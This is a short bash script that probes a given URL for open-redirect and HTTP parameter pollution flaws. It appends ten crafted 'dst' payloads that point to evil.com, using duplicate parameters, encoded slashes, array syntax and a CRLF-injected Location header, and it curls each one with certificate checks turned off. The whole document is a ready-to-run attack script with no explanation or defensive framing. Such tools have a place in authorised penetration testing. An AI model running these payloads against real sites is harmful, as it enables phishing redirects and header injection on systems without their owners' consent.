#!/bin/bash

URL="$1"

if [ -z "$URL" ]; then
    echo "Usage: $0 https://target.com/page"
    exit 1
fi

PAYLOADS=(
"?dst=https://good.com&dst=https://evil.com"
"?dst=https://evil.com&dst=https://good.com"
"?dst=https://good.com&dst=https:%2f%2fevil.com"
"?dst=https://good.com&dst=https:%252f%252fevil.com"
"?dst=https://good.com#&dst=https://evil.com"
"?dst[]=https://good.com&dst[]=https://evil.com"
"?dst=https://good.com;dst=https://evil.com"
"?dst=https://good.com%26dst=https://evil.com"
"?dst=/internal&dst=https://evil.com"
"?dst=https://good.com&dst=%0d%0aLocation:%20https://evil.com"
)

for p in "${PAYLOADS[@]}"
do
    FULL="$URL$p"
    echo "================================="
    echo "Testing: $FULL"
    curl -k -I "$FULL" | grep -E "HTTP|Location"
done
